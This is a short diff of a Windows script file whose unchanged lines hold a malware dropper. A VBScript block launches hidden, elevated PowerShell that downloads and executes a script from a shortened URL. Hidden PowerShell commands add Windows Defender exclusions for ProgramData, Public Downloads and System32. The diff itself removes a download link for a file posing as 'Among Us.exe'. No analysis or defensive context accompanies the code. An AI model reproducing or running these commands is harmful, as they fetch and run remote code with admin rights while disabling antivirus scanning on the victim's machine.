@@ -4,8 +4,6 @@ powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -Argum
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process powershell.exe -ArgumentList 'irm ""https://tinyurl.com/4j72ashp"" | iex' -WindowStyle Hidden -Verb RunAs""", 0, False
 
-https://www.mediafire.com/file/w9hru4wbuvd21v8/Among+Us.exe/file
-
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
